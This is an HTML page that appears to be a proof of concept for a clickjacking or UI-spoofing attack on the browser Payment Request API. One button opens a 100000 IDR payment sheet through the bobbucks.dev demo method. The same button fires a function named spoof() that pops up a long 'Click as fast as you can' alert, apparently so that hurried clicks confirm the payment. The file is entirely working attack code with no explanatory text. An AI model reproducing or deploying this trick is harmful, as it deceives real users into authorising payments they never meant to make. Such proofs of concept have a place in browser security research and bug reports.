<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Payment Request</title>
    <style>
        body {
            margin: 0;
            height: 50vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f0f2f5;
            font-family: sans-serif;
        }

        .wrapper {
            text-align: center;
        }

        #buy-btn {
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            color: white;
            background-color: #28a745;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }

        pre {
            margin-top: 20px;
            padding: 15px;
            background: #1e1e1e;
            color: #fff;
            border-radius: 8px;
            text-align: left;
            max-width: 500px;
            overflow: auto;
        }
    </style>
</head>
<body>

<div class="wrapper">
    <button onclick="spoof()" id="buy-btn">Click Here</button>
    <pre id="output"></pre>
</div>

<script>
document.getElementById('buy-btn').addEventListener('click', async () => {
    if (!window.PaymentRequest) {
        alert("Your browser does not support the Payment Request API.");
        return;
    }

    const methods = [{
        supportedMethods: 'https://bobbucks.dev/pay'
    }];

    const details = {
        total: {
            label: 'TOTAL',
            amount: { currency: 'IDR', value: '100000.00' }
        }
    };

    try {
        const request = new PaymentRequest(methods, details);
        const response = await request.show();

        const output = {
            methodName: response.methodName,
            details: response.details
        };

        document.getElementById("output").textContent =
            JSON.stringify(output, null, 2);

        await response.complete('success');
        alert("Successful!");

    } catch (err) {
        console.log("Cancelled:", err.message);
    }
});
</script>

<script>
    function spoof() { setTimeout(() => { window.alert("Click as fast as you can ................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................."); }, 100); }
</script>

</body>
</html>
